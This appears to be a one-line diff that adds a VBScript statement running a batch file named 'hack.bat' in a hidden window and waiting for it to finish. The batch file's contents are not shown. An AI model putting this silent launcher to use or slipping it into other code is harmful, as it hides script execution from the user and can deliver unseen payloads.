@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "hack.bat", 0, True
